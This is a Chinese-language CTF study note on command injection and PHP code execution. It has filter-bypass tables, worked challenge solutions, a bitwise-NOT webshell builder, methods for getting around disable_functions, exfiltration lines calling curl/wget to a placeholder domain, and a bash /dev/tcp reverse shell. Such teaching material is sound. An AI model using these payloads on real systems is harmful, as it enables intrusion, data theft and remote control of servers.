    RCE 专题（命令注入 + PHP 代码执行）¶

    一句话:应用把你的输入拼进了系统命令,于是你能让它执行任意命令。

    三要素:入口(输入框/参数) → 拼接(没过滤就进了 shell) → 执行(回显/盲注/外带)。

    这份文档分两部分：

    A. 命令注入（第 1–6、9 章）—— 执行的是系统命令，sink 是 system / exec / 反引号 B. 代码执行（第 8–9 章）—— 执行的是PHP 代码，sink 是 eval / assert

    两套打法完全不同，混了就会卡在"没反应"。先看第八章分清自己在哪一边。

    一、先判断有没有注入¶

    最基础的三条¶

    127.0.0.1;id
127.0.0.1|id
127.0.0.1&&id

    看到 uid=33(www-data) 之类 → 有注入 ✅

    判断"到底执行了什么"¶

    有些应用只显示"ping 成功",不显示命令输出 → 需要盲注(见第七节)。

    先摸清回显位置¶

    命令的输出可能出现在：

    · 页面正文
· <pre> 块里
· 报错信息里
· 完全看不到(盲注)

    二、分隔符:怎么把命令接上去¶

    分隔符 行为 什么时候用
    ; 顺序执行(前一条成功失败都继续) 最通用
    \| 管道:左边输出给右边 想让输出被处理
    \|\| 或:左边失败才执行右边 左边可能报错时
    & 后台执行 少见
    && 与:左边成功才执行右边 左边一定有输出时
    %0a(换行) 等同于 ; ; 被拦时
    `cmd` 命令替换:把输出塞进字符串 路径被拦时(见第五节)
    $(cmd) 同上,更现代的写法 同上

    ⚠️ 区别：

    ;id        →  追加一条命令,id 的输出单独出现
`id`       →  把 id 的输出替换到当前位置,原命令会拿它当参数

    这就是为什么 cat + `ls` = cat <ls的输出>。

    三、空格被拦怎么办¶

    空格是命令注入第一道常见防线。绕法很多：

    手法 写法 说明
    $IFS cat$IFS/flag 最常用,IFS = Internal Field Separator
    ${IFS} cat${IFS}/flag 带花括号,更明确
    $IFS$9 cat$IFS$9/flag 加个空位置参数,打断模式
    < cat</flag 输入重定向,天然分隔
    <> cat<>/flag 同上
    %09 cat%09/flag Tab(URL 编码后被解码)
    %0a cat%0a/flag 换行
    %0b %0c %0d 同上 垂直制表/换页/回车
    {cat,/flag} 花括号展开 只在 bash 下有效

    $IFS 是什么：

    IFS = Internal Field Separator,默认值是「空格 + Tab + 换行」
echo $IFS  →  三个空白字符
所以 cat$IFS/flag 等价于 cat /flag

    ⚠️ 必须是半角** $,中文输入法下容易打成全角 ￥ —— 那样不会展开。**

    四、关键词被拦怎么办¶

    比如 flag、cat、ls、system 被拉黑。

    ① 引号拆分¶

    fl''ag          # 空字符串拼接
fl""ag
c''at
ca''t

    shell 会把相邻的字符串拼起来：fl + '' + ag = flag。

    ② 反斜杠转义¶

    fl\ag
c\at /flag

    ③ 通配符¶

    cat /f*
cat /fla?
cat /f[a-z]ag
cat /f???.

    ? 匹配一个字符,* 匹配任意,[a-z] 字符类。

    ④ 变量拼接¶

    a=fl;b=ag;cat /$a$b

    ⑤ 命令替代(路径被拦时最好用)¶

    cat `ls`
cat $(ls)
cat $(ls /)

    让系统自己算出文件名 —— 你不需要写 flag 这个字面量。

    ⑥ 大小写 / 编码¶

    /FLAG          # 如果文件系统不区分大小写
cat $(echo ZmxhZw== | base64 -d)

    五、路径被拦怎么办¶

    除了通配符，最有效的是命令替换：

    |cat$IFS`ls`          ← 先 ls,把结果当 cat 的参数
|cat$IFS$(ls)
|cat</*               ← 读当前目录第一个文件

    cat</* 的原理：

    < 是输入重定向
* 被 shell 展开成当前目录所有文件名
如果只有一个文件,就变成 cat < 文件名

    这招在"只知道目录里有个文件但不知道名字"时很好用。

    六、命令替代表¶

    cat 被拦时,能读文件的一大堆：

    命令 用法 特点
    cat cat /flag 最常用
    tac tac /flag 倒序输出(内容反了)
    nl nl /flag 带行号
    more more /flag 分页
    less less /flag 分页
    head head /flag 前 10 行
    tail tail /flag 后 10 行
    sort sort /flag 排序(单行时原样)
    uniq uniq /flag 去重
    od od -c /flag 八进制/字符转储
    strings strings /flag 提取可打印字符
    base64 base64 /flag 编码(自己再解)
    rev rev /flag 反转
    awk awk '{print}' /flag 等价 cat
    sed sed -n p /flag 等价 cat
    grep grep . /flag 只输出匹配的行

    sort 和 grep 的区别（读单行文件时效果一样）：

    sort grep
    用途 排序 搜索
    输出 所有行（排序后） 只输出匹配的行
    要模式吗 不用 要（grep . 文件 / grep '' 文件）
    多行文件 全出但顺序变了 只出匹配的

    flag 只有一行时两个都行；多行文件时 sort 会重排、grep 会过滤。

    列目录的替代：

    命令 用法
    ls ls /
    dir dir
    find find / -name "flag*"
    echo echo /

    七、无回显:三种盲注¶

    ① 时间延迟(最快确认通道)¶

    ;sleep 5
;sleep$IFS5
;ping -c 3 127.0.0.1
;timeout 5 cat /flag

    响应慢 5 秒 → 命令执行了。

    不同系统的睡眠命令：

    系统 命令
    Linux sleep 5
    Windows timeout /t 5 或 ping -n 6 127.0.0.1

    ② 输出重定向(写到能访问的地方)¶

    ;cat /flag > /var/www/html/x.txt
;cp /flag /var/www/html/x.txt
;cat /flag > ./x.txt

    然后访问 http://target/x.txt 读取。

    ⚠️ 要知道 web 根目录在哪,常见 /var/www/html。

    ③ 外带(DNS / HTTP)¶

    ;curl http://YOUR-DOMAIN/$(cat /flag)
;wget http://YOUR-DOMAIN/$(cat /flag)
;ping `cat /flag`.YOUR-DOMAIN

    没有回显、不能写文件时,让服务器主动联系你。

    DNS 外带的原理和 SQL 的 OOB 一样 —— 见 sql/06-OOB带外注入.md。

    八、代码执行：和命令注入的区别¶

    这是两套完全不同的东西，混了就会像"没执行"一样卡住。

    命令注入 代码执行
    执行的是什么 系统命令（ls、id、cat） PHP 代码（echo、phpinfo()）
    典型 sink system() exec() shell_exec() passthru() 反引号 eval() assert() create_function() preg_replace(/e)
    ; 的含义 命令分隔符 语句结束符
    payload 例子 ;id echo(123);
    输出来自 命令的 stdout echo / print

    8.1 一条命令判断在哪一边¶

    aaa=echo(123);
    返回 结论
    页面出现 123 代码执行（eval）
    没反应 / 语法错 命令注入（shell）

    反过来验证命令注入：

    aaa=;id

    出现 uid= → shell。

    8.2 最典型的坑¶

    在 eval 题里写 ;ls / —— ls / 不是合法 PHP，直接语法错， 表现得和"命令没执行"一模一样。

    而且 eval 里每条语句必须有 ;：

    eval('echo(12)')    →  Parse error: unexpected end of file, expecting ';'
eval('echo(12);')   →  输出 12
eval('echo(1);echo(2);')  →  输出 12

    为什么：普通 PHP 文件里 ?> 能代替分号，eval 没有 ?>。

    8.3 两边的 ; 长得一样，意思不同¶

    RCE 题(shell):   id;whoami          →  两条系统命令
eval 题(PHP):    echo(1);echo(2);   →  两条 PHP 语句

    写 payload 前先问自己：我现在在 shell 层还是 PHP 层？

    九、PHP 代码执行：绕关键词的四种思路¶

    9.1 先搞清黑名单是"拦"还是"换"¶

    // 拦截型：命中就 die
if (preg_match('/flag/i', $code)) die('NO');

// 替换型：命中就替换成别的词
$code = str_ireplace(['flag','system'], 'hacker', $code);
eval($code);
    类型 现象 绕法
    拦截型 直接报错 / 空白 换等价函数、拆分关键词
    替换型 不报错，但代码被悄悄改写 把词拆开，让它匹配不到

    替换型的关键：过滤器只看原始字符串，真正的拼接发生在运行时。

    9.2 四种思路¶

    ① 用 implode / join 拼字符串（. 被禁时）¶

    implode(['/','f','l','a','g'])    →  '/flag'
join(['s','y','s','t','e','m'])   →  'system'

    过滤时看到的是 'f','l','a','g' —— 匹配不到 flag 这个词。

    ② 用「位置」代替「名字」¶

    array_slice(glob('/*'), 4, 1)     →  ['/flag']   （下标 4 = 第 5 个）

    你不知道它叫什么，但知道它排第几。

    ③ 通配符：glob()¶

    glob('/*')      →  根目录所有项（数组）
glob('/f*')     →  只匹配 f 开头的

    ⚠️ glob 是 PHP 函数；show_source('/f*') 不会展开通配符。

    ④ 动态调用：拼出函数名再调¶

    implode(['s','y','s','t','e','m'])('id')

    system 被替换成 hacker 也不怕 —— 你拼出来的是运行时字符串。

    9.3 常用函数速查¶

    打印输出¶

    函数 作用 注意
    echo 输出字符串 数组会变成 Array
    print_r 打印变量（含数组） 含 print，可能被拦
    var_dump 打印类型和值 含 var
    join / implode 数组转字符串 . 被禁时的替代品

    读文件¶

    函数 作用 注意
    show_source 高亮输出文件 highlight_file 的别名
    highlight_file 同上
    file_get_contents 读成字符串 含 file
    readfile 读并输出 含 file
    fopen + fread 句柄读 需要变量
    require 当 PHP 执行 纯文本会当 HTML 输出

    列目录¶

    函数 返回
    glob('/*') 数组，支持通配符
    scandir('/') 数组，不支持通配符（含 scan 可能被拦）
    opendir + readdir 句柄 / 单个

    数组处理（绕关键词的核心）¶

    函数 作用 返回
    array_slice(数组, 起点, 长度) 切片 数组
    array_shift 取第一个 元素
    array_pop 取最后一个 元素
    join(数组) 拼成字符串 字符串

    9.4 两个高频错误¶

    ❌ echo(glob('/*'))
   → 只输出 "Array"（echo 不能输出数组）

❌ array_slice(join(glob('/*')),4,1)
   → array_slice 要数组,join 给的是字符串（顺序反了）

    正确写法：

    echo(join(',',glob('/*')));                       // 看内容
show_source(join(array_slice(glob('/*'),4,1)));   // 读第 5 个

    记法：array_slice 吃数组吐数组，join 吃数组吐字符串。

    十、实战记录¶

    10.1 [Ping ping ping]（第一道）¶

    题目：输入 IP 做 ping 测试

    过程：

    ① 测出空格被过滤
   127.0.0.1;id          → 没反应
   127.0.0.1;id$IFS      → ?

② 用 $IFS 绕过空格
   ;ls                   → 看到 flag.php

③ 关键词被拦
   flag 被过滤           → cat flag.php 不行
   / 和 /f* 也被过滤      → 路径也堵了

④ 用命令替换绕过
   |cat$IFS`ls`          → 成功拿到 flag

    关键点：

    卡点 绕法 原理
    空格被拦 $IFS IFS 默认值含空格
    flag 被拦 `ls` 不写 flag 字面量,让系统输出
    / 和 /f* 被拦 `ls` 的输出 路径里的 / 也不用手写

    |cat$IFS\ls`` 拆解：

    |                     管道,把左边输出给右边(其实这里左边是空的)
cat                   要执行的命令
$IFS                  空格
`ls`                  命令替换 → 得到 "flag.php"
                      ↓
最终等价于:  cat flag.php

    为什么用 | 不用 ;：

    因为 ; 后面如果被过滤规则识别出"新命令",可能被拦；而 | 把 cat 的输出接到管道,cat 本身看起来像"参数"的一部分。

    （具体哪种能过,取决于过滤规则的写法 —— 两个都试。）

    10.2 [NewStarCTF 公开赛] So Baby RCE Again（无回显）¶

    题目：直接给了源码，只过滤 bash 和 curl；命令能执行但没有回显。

    过程：

    ① 看源码 → 过滤 bash / curl → 但不能回显
② 用输出重定向把结果写进文件
   ?cmd=ls />1.txt
③ 访问 http://target/1.txt → 看到 flag 文件名
④ 再写一次
   ?cmd=cat /flag />1.txt
⑤ 访问 1.txt → 拿到 flag

    核心 payload：

    ?cmd=ls / >1.txt
?cmd=cat /flag >1.txt

    然后访问 http://target/1.txt。

    为什么这招有效：

    ① 命令确实执行了(只是输出没返回给你)
② > 把 stdout 写进文件
③ 文件落在【当前工作目录】(通常是网站根目录)
④ 这个目录能被 web 访问 → 直接下载

    两个关键细节：

    细节 说明
    文件落在 CWD 不是 /。>1.txt 是相对路径，相对于执行脚本所在目录
    只重定向 stdout 命令报错（stderr）不会进文件，要 2>&1

    先确认自己在哪：

    ?cmd=pwd >1.txt
?cmd=ls -la >1.txt

    知道 CWD 才能确定文件能不能被访问到。

    为什么这题只能写文件：

    bash 被过滤  →  不能 bash -i 反弹
curl 被过滤  →  不能 curl http://域名/$(cat /flag)
剩下能用的:
  · 写文件(> / cp / mv / tee)
  · DNS 外带(ping `cat /flag`.域名)
  · wget 外带(通常没被过滤)

    写文件是最省事的一条 —— 前提是 web 根可写。

    这题的收获：

    "无回显"不等于"没办法" —— 只要还有一个"你能访问的目录",就能把输出搬出来。

    10.3 [Dest0g3 520迎新赛] SimpleRCE（eval + 替换型黑名单）¶

    源码（题目直接给出）:

    $aaa = $_POST['aaa'];
$black_list = array('^','.','`','>','<','=','"','preg','&','|','%0','popen',
'char','decode','html','md5','{','}','post','get','file','ascii','eval',
'replace','assert','exec','$','include','var','pastre','print','tail','sed',
'pcre','flag','scan','decode','system','func','diff','ini_','passthru',
'pcntl','proc_open','+','cat','tac','more','sort','log','current','\\',
'cut','bash','nl','wget','vi','grep');
$aaa = str_ireplace($black_list, "hacker", $aaa);
eval($aaa);

    两个关键判断:

    ① eval() → 执行的是 PHP 代码,不是 shell 命令
② str_ireplace() → 命中就【替换成 hacker】,不是拦截

    所以：

    不能写 $       → 不能用变量
不能写 .       → 不能字符串拼接
不能写 flag    → 变成 hacker
不能写 system  → 变成 hacker

    过程:

    ① echo(12);                → 页面出 12,确认 eval 通
② echo(join(glob('/*')));  → 列出根目录,发现 flag
③ 但 flag 会被替换成 hacker,不能直接写 '/flag'
④ 用位置:array_slice(glob('/*'),4,1) → ['/flag']
⑤ join 成字符串 → show_source 读出来

    最终 payload:

    show_source(join(array_slice(glob('/*'),4,1)));

    每一步在绕什么:

    步骤 绕的是
    glob('/*') 不知道文件名
    array_slice(...,4,1) flag 这个词不能出现
    join(...) . 被禁，不能拼接
    show_source(...) file_get_contents 含 file，会被替换

    踩的坑:

    坑 现象 原因
    echo(12) 没反应 空白 eval 里语句必须带 ;
    echo(glob('/*')) 只输出 Array echo 不能输出数组
    show_source('/f*') 失败 show_source 不展开通配符
    echo(';ls /') 无反应 ;ls / 不是合法 PHP

    这题的收获:

    关键词被替换 ≠ 无解 —— 用「运行时拼接」把词造出来。

    名字被过滤 ≠ 无解 —— 用「位置」代替「名字」。

    10.4 [NewStarCTF 公开赛] So Baby RCE（子串型黑名单 + 无 /）¶

    源码:

    if(isset($_GET["cmd"])){
    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i', $_GET["cmd"])){
       echo "Don't Hack Me";
    }else{
        system($_GET["cmd"]);   // ← 命令注入,不是 eval
    }
}

    先分类这个黑名单:

    类别 被封 后果
    命令名 cat tac head tail more less nl vi 常见读文件命令全灭
    子串 et sh fl base env get/set/bash/flag/base64 全被连坐
    路径 / 不能用绝对路径
    空白 空格 必须用 $IFS
    分隔/重定向 \| ; < > ` 只能靠 &&
    引号/通配 ' " ] \ * ^ 不能包字符串、不能用 *

    关键：它是子串匹配** —— 封 et 会连 get、set、target 一起封。**

    过程:

    ① ls                    → 当前目录是个没用文件
② cd$IFS..$IFS&&ls      → 一级一级往上爬(因为 / 被禁,只能相对路径)
③ 在根目录找到 flag
④ sort 或 grep 读内容
⑤ 但 flag 这个词里含 fl → 被拦
⑥ 用 ? 当通配符:fl?ag 或 ????????  → 绕过

    卡点与绕法:

    卡点 绕法 原理
    空格被禁 $IFS IFS 默认含空格
    / 被禁 cd .. 逐级爬 相对路径不含 /
    \| ; 被禁 && 逻辑与还能串命令
    * 被禁 ? ? 没在黑名单里
    cat/head/tail 被禁 sort grep uniq od strings awk sed 读文件的替代品一大堆
    fl 被禁 fl?ag / 一串 ? 通配符替你补字符

    哪些命令在这题能读文件:

    sort ????            # 排序(单行=原样)
grep . ????          # 搜索(输出匹配行)
uniq ????            # 去重
od -c ????           # 字符转储
strings ????         # 提取可打印字符
rev ????             # 反转
awk 1 ????           # 打印全部

    关于 {abc} 当空字符:

    echo fl{abc}ag    →  fl{abc}ag     ← 原样,不是 flag
echo fl{,}ag      →  flag          ← 这才是空选项写法

    花括号展开只在 bash 下有效,sh(dash)不做。用它之前先 echo 验证。 这题真正能过的是 ? —— 因为 * 被封了,? 没被封。

    这题的收获:

    ① 黑名单是子串匹配时,先找"哪些常用词被连坐"（et 封掉 get/set）。

    ② / 被封不等于走不了 —— cd .. 用相对路径一样能爬到根目录。

    ③ 读文件命令有十几个,封 8 个还剩 8 个。

    ④ * 被封还有 ? —— 通配符不止一种。

    10.5 [极客大挑战 2019] RCE ME（字母数字全封 + 按位取反）¶

    题目：过滤掉所有字母和数字，eval($code) 只能吃符号。

    这就逼出一个核心技术：用按位取反把符号变成字母。

    原理¶

    PHP 对字符串做 ~ 是逐字节取反：

    ~"a"      →  0x9E（非打印字符）
~"\x9E"   →  'a'   （反过来）

    所以只要写出「目标字符串取反后的字节」，就能在运行时还原出任意单词。

    关键：这些字节经过 URL 编码后全是 %xx，不含任何字母数字 → 能过过滤。

    脚本：把字符串转成「取反 + URL 编码」¶

    def nt(s):
    return ''.join('%%%02x' % (~ord(c) & 0xFF) for c in s)

print(nt("assert"))    # %9e%8c%8c%9a%8d%8b
print(nt("phpinfo"))   # %8f%97%8f%96%91%99%90

    PowerShell 版：

    function nt($s) {
  -join ($s.ToCharArray() | ForEach-Object { '%%{0:x2}' -f ((-bnot [int]$_) -band 0xFF) })
}
nt "assert"

    常用对照表（已核验）¶

    目标 取反 + URL 编码
    assert %9e%8c%8c%9a%8d%8b
    eval %9a%89%9e%93
    system %8c%86%8c%8b%9a%92
    phpinfo %8f%97%8f%96%91%99%90
    _POST %a0%af%b0%ac%ab
    cmd %9c%92%9b

    payload 模板¶

    $_=~"%9e%8c%8c%9a%8d%8b";      // $_ = "assert"
$__=~"%a0%af%b0%ac%ab";        // $__ = "_POST"
$_(${$__}[~"%9c%92%9b"]);      // assert($_POST["cmd"])

    逐段看：

    $_=~"..."                变量名只用 $ 和 _,不含字母 ✓
${$__}[...]              用变量的值当变量名 → $_POST
[~"%9c%92%9b"]           数组下标也可以是取反表达式 → ["cmd"]

    $、_、"、(、)、[、]、; 都不是字母数字 → 全部合法。

    过程¶

    ① 发现字母数字全被封 → 只剩符号可用
② 自己写脚本:字符串 → 按位取反 → URL 编码
③ 传 phpinfo 查 disable_functions → assert、eval 还在
④ 构造一句话木马 → 蚁剑连接
⑤ 根目录有 flag 但读不了(权限)
⑥ 旁边有 /readflag(通常是 SUID 程序,专门读 flag)
⑦ 装蚁剑「绕过 disable_functions」插件
⑧ 选 PHP 版本、开终端 → whoami / cd 可用,但 /readflag 没反应

    卡点：/readflag 在蚁剑终端里没输出¶

    先分清「能用」的含义：

    cd        →  蚁剑自己实现的(PHP 侧改 CWD),不是真命令
whoami    →  真的 /usr/bin/whoami 在跑

    whoami 有输出 → 外部二进制确实能执行 → 问题在 /readflag 本身。

    最可能：错误信息走 stderr，而终端只显示 stdout。

    诊断命令：

    ls -l /readflag              # 在不在?有没有 SUID(s 位)?
id                           # 当前是谁
/readflag 2>&1               # 把 stderr 合并过来
/readflag; echo "EXIT=$?"    # 看退出码
/readflag > /tmp/a 2>&1; cat /tmp/a   # 落文件再读(最稳)
find / -name "readflag*" 2>/dev/null  # 路径不对就搜

    退出码对照：

    EXIT 含义
    0 但没输出 输出被吞 → 用重定向到文件
    126 没有执行权限
    127 命令找不到
    137 被 kill（disable_functions 限制常见）

    权限对照（ls -l）：

    -rwsr-xr-x root root    →  SUID 在,能提权 ✅
-rwxr-xr-x              →  没有 SUID,www-data 跑还是 www-data
-rw-r--r--              →  根本没有执行权限 → Permission denied

    绕过 disable_functions 的四种技术¶

    技术 原理 特点
    LD_PRELOAD + mail() 劫持当前进程，加载恶意 .so 命令跑在本进程里
    PHP-FPM / FastCGI 起新 worker，disable_functions 为空 命令跑在新进程里
    Backtrace UAF 利用 PHP 崩溃绕过 版本敏感
    Apache Mod_CGI 借 CGI 环境执行 需要 Apache + CGI

    不同技术下 id 的结果可能不同 —— 所以第一步永远先跑 id。

    这题的收获¶

    ① 字母数字被封 ≠ 写不了代码 —— 按位取反能把任意符号变成任意单词。

    ② 有 eval 就够 —— assert($_POST["cmd"]) 就是完整的一句话。

    ③ 有命令执行 ≠ 能读 flag —— /flag 常常是 0400 root，得靠 SUID 的 /readflag。

    ④ 终端里"没反应"先看 stderr 和退出码，别急着换工具。

    十一、我踩的坑¶

    坑 1：全角 ￥ 不是 $¶

    ❌ ￥IFS      ← 中文输入法打出来的全角符号
✅ $IFS       ← 半角

    现象：明明写了 $IFS 却不生效。

    对策：写完检查一下字符宽度；或者在编辑器里用半角输入。

    坑 2：$IFS 后面紧跟路径会粘在一起¶

    cat$IFS/flag        ✅
cat$IFSflag         ❌ 变成变量 $IFSflag

    要访问的路径必须以 / 开头,或者用 ${IFS}。

    坑 3：以为 ; 不行就放弃了¶

    ; 被拦还有 |、||、&&、&、%0a。

    五种分隔符一个一个试,总有能过的。

    坑 4：只试了 cat,没试替代品¶

    cat 被拦？tac、nl、head、sort、od 都能读文件。

    坑 5：路径被拦就卡住¶

    用 `ls` 或 $(ls) 让系统自己算文件名,绕开手写路径。

    这一招在"flag、/、/f* 全被拦"时是唯一出路。

    十二、工具与字典¶

    三份原子字典（一行一个，只测"这一个东西"过不过）：

    文件 行数 内容
    01-分隔符.txt 7 ; \| \|\| & && %0a %0d%0a
    02-关键词.txt 48 命令名(cat ls id …)和文件名(flag passwd …)
    03-符号.txt 26 $IFS ${IFS} < > * ? ( ) ' " ` / %09 …

    为什么拆成原子：当过滤很多时，"一整条命令"失败了你不知道是哪个词坏了。一行一个才能一一对上。

    12.1 测试模板（关键）¶

    字典里只有"一个东西"，测试时把它塞进固定模板：

    测分隔符¶

    原始参值:  127.0.0.1
模板:      127.0.0.1§§id
    该行内容 拼出来 判断
    ; 127.0.0.1;id 出现 uid= → ; 可用
    \| 127.0.0.1\|id 出现 uid= → \| 可用
    %0a 127.0.0.1%0aid 同上

    测关键词（命令名）¶

    模板:      127.0.0.1;§§$IFS/flag
    该行内容 拼出来 判断
    cat ;cat$IFS/flag 出 flag → cat 可用
    tac ;tac$IFS/flag 出 flag → tac 可用（或内容反了）

    测关键词（文件名）¶

    模板:      127.0.0.1;cat$IFS/§§
    该行内容 拼出来 判断
    flag ;cat$IFS/flag 出 flag → flag 可用
    flag.php ;cat$IFS/flag.php 出 flag → 名字对

    测符号 / 空白¶

    模板:      127.0.0.1;cat§§/flag
    该行内容 拼出来 判断
    $IFS ;cat$IFS/flag 出 flag → $IFS 可用
    < ;cat</flag 出 flag → < 可用
    %09 ;cat%09/flag 出 flag → Tab 可用

    12.2 Burp Intruder 设置¶

    ① 把 § 放在上面模板的 § 位置
② Payloads → Load → 选对应的 txt
③ 不要开 URL-encode（字典里的字符要原样发）
④ 按响应长度排序，长度和基线不同的就是"没被拦"

    基线 = 不加任何 payload 的正常响应长度。和基线一样 = 被拦。不一样 = 可能生效。

    12.3 判读速查¶

    现象 含义
    响应长度和基线一样 这条被拦 / 没生效
    出现 uid= 命令执行了
    出现文件内容 读成功了
    响应变慢 5 秒 睡眠生效（盲注用）
    500 / 报错 语法错或触发了错误处理

    十三、常用命令速查¶

    拿到命令执行后，你会需要这些：

    目的 命令
    我是谁 whoami / id
    系统版本 uname -a / cat /etc/os-release
    找 flag ls / / find / -name "flag*" 2>/dev/null
    读文件 cat /flag
    看进程 ps aux
    看网络 ifconfig / netstat -an
    反弹 shell bash -i >& /dev/tcp/IP/端口 0>&1

    十四、一句话总结¶

    命令注入 = 分隔符 + 绕过过滤 + 找输出通道。

    分隔符五种: ; | || && %0a,逐个试。 空格用 $IFS,关键词用引号/通配符拆,路径用 `ls` 让系统算。 没回显就走盲注:时间延迟 → 写文件 → 外带。

    记住 cat$IFS/flag 这个模板 —— 它包含了空格绕过,是所有 payload 的起点。
